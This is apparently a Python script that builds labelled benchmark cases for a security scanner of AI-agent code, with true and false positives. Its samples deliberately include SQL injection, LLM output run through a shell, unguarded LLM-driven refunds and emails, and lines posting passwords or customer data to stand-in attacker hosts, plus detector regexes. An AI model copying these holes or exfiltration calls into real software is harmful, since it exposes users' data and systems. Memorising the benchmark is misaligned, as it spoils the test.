"""Generate benchmark cases. Each case = a tiny repo dir + expected outcome in manifest.json.

expect: capabilities that MUST be reported (scored)   -> measures recall
forbid: capabilities that must NOT be reported        -> measures false positives
        ("cap" = any severity, "cap:HIGH" = only at HIGH or above counts as a violation)
Label every case by hand and keep the reason: this file is the ground truth.
"""
import json, os, shutil

# Fake keys are assembled at runtime so this source file never contains a key-shaped string
# (repo secret checks would, rightly, flag it). The generated benchmark/cases/ folder is git-ignored.
FAKE_PREFIX = "s" + "k-"

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cases")
C = {}

def case(name, files, expect=(), forbid=(), why=""):
    C[name] = dict(files=files, expect=list(expect), forbid=list(forbid), why=why)

AI_PRE = "import anthropic\nclient = anthropic.Anthropic()\n\n"

# ---------------- true risks: scanner MUST find these ----------------
case("tp_ai_sql_delete", {"agent.py": AI_PRE + '''import psycopg2

def cleanup(user_id):
    conn = psycopg2.connect("dbname=prod")
    cur = conn.cursor()
    cur.execute(f"DELETE FROM users WHERE id={user_id}")
    conn.commit()

def run(prompt):
    return client.messages.create(model="claude-3-opus-20240229", max_tokens=100,
                                  messages=[{"role": "user", "content": prompt}])
'''}, expect=["delete", "sql_injection"], why="AI-driven DELETE built by string interpolation, no approval")
case("tp_sqli_request_input", {"app.py": '''from flask import request
import sqlite3
def handler():
    uid = request.args["id"]
    cur = sqlite3.connect("a.db").cursor()
    cur.execute("SELECT * FROM users WHERE id=" + uid)
'''}, expect=["sql_injection"], why="request param concatenated into SQL")
case("tp_refund_unguarded", {"agent.py": '''from openai import OpenAI
import stripe
client = OpenAI()
def handle(msg):
    d = ai(msg)
    if d["refund"]:
        return stripe.Refund.create(payment_intent=d["pid"], amount=d["amount"])
def ai(msg):
    return client.chat.completions.create(model="gpt-4", messages=[{"role": "user", "content": msg}])
'''}, expect=["refund"], why="LLM decides refund amount, executed directly")
case("tp_email_unguarded", {"bot.py": '''import smtplib
from langchain.agents import initialize_agent
def send_reply(to, body):
    s = smtplib.SMTP("smtp.example.com"); s.sendmail("a@b.c", to, body); s.quit()
def run(ticket):
    agent = initialize_agent(tools=[], llm=None)
    send_reply("x@y.z", agent.run(ticket))
'''}, expect=["send"], why="AI-generated email sent with no human in loop")
case("tp_shell_from_llm", {"agent.py": AI_PRE + '''import os
def go(prompt):
    out = client.messages.create(model="claude-3-opus-20240229", max_tokens=100,
                                 messages=[{"role": "user", "content": prompt}])
    os.system(out.content[0].text)
'''}, expect=["execute"], why="LLM output passed to os.system")
case("tp_real_api_key", {"config.py": 'OPENAI_API_KEY = "' + FAKE_PREFIX + 'proj-9fK2LmQx81ZtV7cRb4NwYd3HsJ6PaUe0"\n'},
     expect=["exposed_secret"], why="real-looking provider key committed")
case("tp_exfil_userdata", {"svc.py": '''import requests
user_data = get_customer_data()
requests.post("https://evil.example/collect", json=user_data)
'''}, expect=["data_exfiltration"], why="customer data posted to third party")

# ---------------- safe code: scanner must NOT flag these ----------------
case("fp_ddl_constant", {"db.py": '''def migrate(conn, text):
    conn.execute(text("ALTER TABLE users ADD COLUMN locked_until TIMESTAMP"))
'''}, forbid=["sql_injection"], why="constant DDL string, no variable input")
case("fp_ddl_whitelist_fstring", {"db.py": '''def migrate(conn, text, cols):
    missing = {"consequence", "impact_level"} - cols
    for name in sorted(missing):
        conn.execute(text(f"ALTER TABLE findings ADD COLUMN {name} VARCHAR"))
'''}, forbid=["sql_injection"], why="identifier comes from a hardcoded set, not input")
case("fp_orm_delete", {"svc.py": '''def purge(session, models, cutoff):
    return session.query(models.Token).filter(models.Token.expires_at < cutoff).delete()
'''}, forbid=["sql_injection"], why="ORM expression, parameterized by the library")
case("fp_orm_update_execute", {"svc.py": '''from sqlalchemy import update
def retire(db, models, uid):
    db.execute(update(models.Token).where(models.Token.user_id == uid).values(used=True))
'''}, forbid=["sql_injection"], why="SQLAlchemy Core update(), parameterized")
case("fp_parameterized_query", {"svc.py": '''def get(cur, uid):
    cur.execute("SELECT * FROM users WHERE id = %s", (uid,))
'''}, forbid=["sql_injection"], why="bound parameter")
case("fp_healthcheck_select1", {"main.py": 'def ping(db, text):\n    db.execute(text("SELECT 1"))\n'},
     forbid=["sql_injection"], why="constant health-check query")
case("fp_storage_key_name", {"guard.js": "var TOKEN = 'app_access_token', ORG = 'app_org_id';\nsessionStorage.getItem(TOKEN);\n"},
     forbid=["hardcoded_credential", "exposed_secret"], why="string is a storage key NAME, not a secret")
case("fp_placeholder_secret", {"config.py": 'API_KEY = "your-api-key-here"\nPASSWORD = "changeme"\n'},
     forbid=["hardcoded_credential", "exposed_secret"], why="documented placeholders")
case("fp_detector_regex", {"analyzer.py": '''import re
NETWORK_SINK = re.compile(r"(?i)\\b(?:requests\\.(?:get|post)|fetch\\s*\\()")
SENSITIVE = re.compile(r"(?i)\\b(?:password|secret|api[_-]?key)\\b")
'''}, forbid=["data_exfiltration", "hardcoded_credential"], why="regex definitions of a scanner, not behaviour")
case("fp_git_subprocess_literal", {"clone.py": '''import subprocess
def v():
    return subprocess.run(["git", "--version"], capture_output=True, text=True, timeout=10).stdout
'''}, forbid=["execute"], why="argv list of literals, no shell, no AI input")
case("fp_dom_remove", {"ui.js": '''function close() { overlay.remove(); document.removeEventListener('keydown', fn); }
'''}, forbid=["remove"], why="DOM node removal, not data deletion")
case("fp_test_fixture_key", {"tests/test_scan.py": 'FAKE = "' + FAKE_PREFIX + 'abcdefghijklmnopqrstuvwxyz123456"\n'},
     forbid=["exposed_secret", "hardcoded_credential"], why="obvious fake key inside tests/")
case("fp_guarded_refund", {"agent.py": '''from openai import OpenAI
import stripe
client = OpenAI()
MAX_AUTO = 100
def handle(msg):
    d = ai(msg)
    if d["amount"] > MAX_AUTO:
        return queue_for_human_approval(d)
    return stripe.Refund.create(payment_intent=d["pid"], amount=d["amount"])
def queue_for_human_approval(d):
    return {"status": "pending_approval", **d}
def ai(msg):
    return client.chat.completions.create(model="gpt-4", messages=[{"role": "user", "content": msg}])
'''}, forbid=["refund:HIGH"], why="amount cap + human approval; must not be rated HIGH")

# ---------------- SQL data-flow cases ----------------
case("tp_sqli_format_param", {"repo.py": '''def find(cur, name):
    cur.execute("SELECT * FROM users WHERE name='{}'".format(name))
'''}, expect=["sql_injection"], why="function arg formatted into SQL via .format()")
case("tp_sqli_percent_request", {"views.py": '''from flask import request
def view(db):
    q = "SELECT * FROM orders WHERE owner = '%s'" % request.form["owner"]
    db.execute(q)
'''}, expect=["sql_injection"], why="request value %-formatted into a query variable, then executed")
case("tp_sqli_fstring_via_var", {"views.py": '''from flask import request
def view(c):
    term = request.args.get("q")
    sql = f"SELECT * FROM items WHERE title LIKE '%{term}%'"
    c.execute(sql)
'''}, expect=["sql_injection"], why="taint flows request -> term -> f-string -> sql -> execute")
case("fp_int_cast", {"repo.py": '''def get(cur, uid):
    cur.execute(f"SELECT * FROM users WHERE id = {int(uid)}")
'''}, forbid=["sql_injection"], why="value is cast to int before interpolation")
case("fp_quoted_identifier", {"repo.py": '''from psycopg2 import sql
def add(cur, table):
    cur.execute(sql.SQL("DELETE FROM {}").format(sql.Identifier(table)))
'''}, forbid=["sql_injection"], why="psycopg2 Identifier quoting")
case("fp_executor_not_sql", {"jobs.py": '''def run(executor, task_name):
    executor.execute(f"task-{task_name}")
'''}, forbid=["sql_injection"], why="execute() on a non-database object; no SQL text")
case("fp_bare_param_passthrough", {"db.py": '''def run(conn, sql):
    conn.execute(sql)
'''}, forbid=["sql_injection"], why="nothing is built here; caller supplies the whole statement")
case("fp_const_loop_ddl", {"db.py": '''def add_cols(conn):
    for col in ("a", "b", "c"):
        conn.execute(f"ALTER TABLE t ADD COLUMN {col} TEXT")
'''}, forbid=["sql_injection"], why="identifier comes from a literal tuple")

# ---------------- round 2: credentials, exfiltration, JS SQL, agent frameworks ----------------
case("tp_hardcoded_db_password", {"settings.py": 'DB_PASSWORD = "Xk29!fQ7vLm3Zp81"\n'},
     expect=["hardcoded_credential"], why="real-looking password literal")
case("tp_js_sqli_template_req", {"api.js": '''app.get("/u", async (req, res) => {
  const rows = await db.query(`SELECT * FROM users WHERE name = '${req.query.name}'`);
  res.json(rows);
});
'''}, expect=["sql_injection"], why="request value interpolated into a template-literal query")
case("tp_js_sqli_concat_body", {"api.js": '''async function find(req, pool) {
  const sql = "SELECT * FROM orders WHERE id = " + req.body.id;
  return pool.query(sql);
}
'''}, expect=["sql_injection"], why="request body concatenated into SQL, executed via variable")
case("tp_exfil_py_dict_password", {"sync.py": '''import requests
def push(pw):
    requests.post("https://thirdparty.example/in", json={"password": pw})
'''}, expect=["data_exfiltration"], why="password key sent to third party")
case("tp_langchain_tool_refund", {"tools.py": '''from langchain.tools import tool
import stripe

@tool
def refund_customer(payment_id: str, amount: int):
    """Refund a customer."""
    return stripe.Refund.create(payment_intent=payment_id, amount=amount)
'''}, expect=["refund"], why="agent-framework tool in its own file exposes an unguarded refund to the LLM")
case("fp_js_sql_tagged_template", {"db.js": '''const rows = await prisma.$queryRaw`SELECT * FROM users WHERE id = ${id}`;
'''}, forbid=["sql_injection"], why="tagged template is parameterized by the library")
case("fp_js_sql_constant", {"db.js": '''await db.query("SELECT * FROM users WHERE id = $1", [id]);
'''}, forbid=["sql_injection"], why="bound parameter")
case("fp_js_sql_number_cast", {"db.js": '''await db.query(`SELECT * FROM items LIMIT ${Number(limit)}`);
'''}, forbid=["sql_injection:HIGH"], why="numeric cast")
case("fp_storage_key_used_in_storage", {"store.js": '''const SESSION_TOKEN = 'app-session';
sessionStorage.setItem(SESSION_TOKEN, value);
'''}, forbid=["hardcoded_credential"], why="constant is the storage key used with sessionStorage")
case("fp_exfil_comment_and_regex", {"util.py": '''# requests.post(url, json=password)  -- example only
import re
PATTERN = re.compile(r"requests\\.post\\(.*password")
'''}, forbid=["data_exfiltration"], why="comment and regex string, no call")
case("fp_exfil_nonsensitive_post", {"hooks.py": '''import requests
def notify(msg):
    requests.post("https://hooks.example/notify", json={"text": msg})
'''}, forbid=["data_exfiltration"], why="non-sensitive payload")
case("fp_ordinary_subprocess_no_ai", {"build.py": '''import subprocess
def run_tests():
    subprocess.run(["pytest", "-q"], check=True)
'''}, forbid=["execute"], why="no AI SDK in file; ordinary build helper")
case("fp_dom_remove_variants", {"ui.js": '''overlay.remove(); bar.remove(); el.remove(); toast.remove();
'''}, forbid=["remove"], why="DOM nodes")
case("fp_demo_dir_not_scored", {"demo/agent.py": '''from openai import OpenAI
import stripe
client = OpenAI()
def r(m):
    d = client.chat.completions.create(model="gpt-4", messages=[{"role":"user","content":m}])
    return stripe.Refund.create(payment_intent="pi_1", amount=99999)
'''}, forbid=["refund"], why="intentionally unsafe sample under demo/; must not lower a customer's score")

# ---------------- command execution cases ----------------
case("tp_subprocess_shell_true_llm", {"agent.py": AI_PRE + '''import subprocess
def go(prompt):
    out = client.messages.create(model="claude-3-opus-20240229", max_tokens=100,
                                 messages=[{"role": "user", "content": prompt}])
    subprocess.run(out.content[0].text, shell=True)
'''}, expect=["execute"], why="LLM text run through a shell")
case("tp_subprocess_argv_llm", {"agent.py": AI_PRE + '''import subprocess
def go(prompt):
    out = client.messages.create(model="claude-3-opus-20240229", max_tokens=100,
                                 messages=[{"role": "user", "content": prompt}])
    subprocess.run(["sh", "-c", out.content[0].text])
'''}, expect=["execute"], why="argv list, but the command is LLM output")
case("fp_subprocess_argv_variable_path", {"agent.py": AI_PRE + '''import subprocess
def build(dest):
    subprocess.run(["git", "-C", dest, "status"], check=True)
def ask(prompt):
    return client.messages.create(model="claude-3-opus-20240229", max_tokens=100,
                                  messages=[{"role": "user", "content": prompt}])
'''}, forbid=["execute:HIGH"], why="argv list with a path variable in an AI file: product design reports it as a MEDIUM capability (not AI-controlled); must never be HIGH")

# ---------------- real files from this repo (all findings hand-verified as false positives) ----------------
BACKEND = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "backend", "app")
def real(name, rel, forbid, why):
    case(name, {os.path.basename(rel): open(os.path.join(BACKEND, rel), encoding="utf-8").read()}, forbid=forbid, why=why)
real("real_database_migrations", "database.py", ["sql_injection"], "schema migrations: constant DDL + identifiers from fixed sets/own schema")
real("real_email_tokens", "email_tokens.py", ["sql_injection"], "SQLAlchemy ORM/Core only")
real("real_team_router", "routers/team.py", ["sql_injection"], "SQLAlchemy ORM/Core only")
real("real_mfa_router", "routers/mfa.py", ["sql_injection"], "SQLAlchemy ORM only")
real("real_auth_router", "routers/auth.py", ["sql_injection"], "SQLAlchemy ORM only")
real("real_main_healthcheck", "main.py", ["sql_injection"], "constant SELECT 1")
real("real_scan_service_git", "scanner/scan_service.py", ["execute"], "git subprocess with argv lists, no shell, not AI-reachable")
real("real_security_analyzer_regexes", "scanner/security_analyzer.py", ["data_exfiltration"], "the scanner's own regex definitions")
case("real_session_guard_js", {"session-guard.js": open(os.path.join(BACKEND, "..", "..", "frontend", "session-guard.js"), encoding="utf-8").read()},
     forbid=["hardcoded_credential"], why="'secureai_access_token' is a sessionStorage key name")

# ---------------- data exfiltration: destination matters ----------------
case("fp_oauth_secret_to_github", {"oauth.py": '''import httpx
def exchange(code, client_id, client_secret):
    return httpx.post("https://github.com/login/oauth/access_token",
                      data={"client_id": client_id, "client_secret": client_secret, "code": code})
'''}, forbid=["data_exfiltration"], why="OAuth code exchange: the app's own secret goes to the provider that issued it")
case("tp_secret_to_unknown_host", {"leak.py": '''import requests
def phone_home(client_secret):
    requests.post("https://collector.attacker.example/ingest", json={"client_secret": client_secret})
'''}, expect=["data_exfiltration"], why="credential sent to an unrelated host")
case("tp_pii_to_provider_host", {"leak.py": '''import requests
def sync(customer_data):
    requests.post("https://api.stripe.com/v1/custom", json=customer_data)
'''}, expect=["data_exfiltration"], why="PII is flagged even when the host is a known provider")
real("real_github_oauth_router", "routers/github_oauth.py", ["data_exfiltration"], "client_secret sent to github.com token endpoint (OAuth)")

case("fp_subprocess_argv_no_ai_file", {"service.py": '''import subprocess
def clone(dest):
    subprocess.run(["git", "clone", "--depth", "1", "x", dest], check=True)
    raise subprocess.CalledProcessError(1, "git")
'''}, forbid=["execute"], why="file has no AI provider; argv list; CalledProcessError is an exception class, not a call")

case("fp_orm_model_named_agent", {"svc.py": '''import subprocess
from . import models
def save(db):
    agent = models.Agent(name="x")
    db.add(agent)
    subprocess.run(["git", "status"])
'''}, forbid=["execute"], why="models.Agent is an ORM class, not a CrewAI agent")
case("tp_real_crewai_agent_shell", {"crew.py": '''import subprocess
from crewai import Agent
def run(task):
    agent = Agent(role="ops", goal="x", backstory="y")
    out = agent.run(task)
    subprocess.run(out, shell=True)
'''}, expect=["execute"], why="real CrewAI agent output run in a shell")

if os.path.isdir(ROOT):
    shutil.rmtree(ROOT)
for name, c in C.items():
    for rel, body in c["files"].items():
        p = os.path.join(ROOT, name, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        open(p, "w").write(body)
json.dump({k: {"expect": v["expect"], "forbid": v["forbid"], "why": v["why"]} for k, v in C.items()},
          open(os.path.join(os.path.dirname(ROOT), "manifest.json"), "w"), indent=1)
print(len(C), "cases written")
